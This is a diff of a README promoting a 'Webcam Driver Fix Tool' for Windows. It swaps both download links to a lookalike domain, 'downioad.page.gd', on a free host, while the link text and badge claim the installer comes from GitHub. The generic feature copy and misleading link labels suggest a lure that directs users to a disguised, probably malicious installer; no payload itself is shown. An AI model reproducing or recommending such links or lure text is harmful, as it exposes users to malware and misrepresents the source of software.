@@ -2,7 +2,7 @@
 
 Webcam Driver Fix Tool is a comprehensive software solution designed for Windows 10 and 11 users to resolve common webcam issues. It automatically scans, updates, and repairs camera drivers, ensuring seamless functionality without manual intervention. This tool is your go-to utility for fixing webcam not detected errors and driver conflicts in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Why Use Webcam Driver Fix Tool?
 
@@ -72,6 +72,6 @@ For any queries, feedback, or issues, you can reach out to our support team via 
 ## Download
 
 For the latest version, please visit the official download page:
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 **Note:** This tool is free to use and does not require any subscription. Last updated: 2026.
